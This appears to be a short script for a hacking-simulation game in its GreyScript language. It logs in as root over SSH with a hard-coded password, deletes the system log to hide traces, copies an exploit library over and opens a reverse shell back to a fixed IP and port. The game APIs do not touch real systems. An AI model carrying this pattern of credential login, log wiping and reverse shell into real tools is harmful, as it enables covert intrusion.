metax = include_lib("/lib/metaxploit.so")
if not metax then
	server_shell = get_shell.connect_service("220.185.222.135", 22, "root", "Pearc")
	if not server_shell then exit()

	logs = get_shell.host_computer.File("/var/system.log")
	logs.delete

	server_shell.scp("/lib/metaxploit.so", "/lib", get_shell)
	metax = include_lib("/lib/metaxploit.so")
end if

if not metax then exit()

receiver = {}
receiver.ip = "220.185.222.135"
receiver.port = 1222

metax.rshell_client(receiver.ip, receiver.port, "RShellVictim")
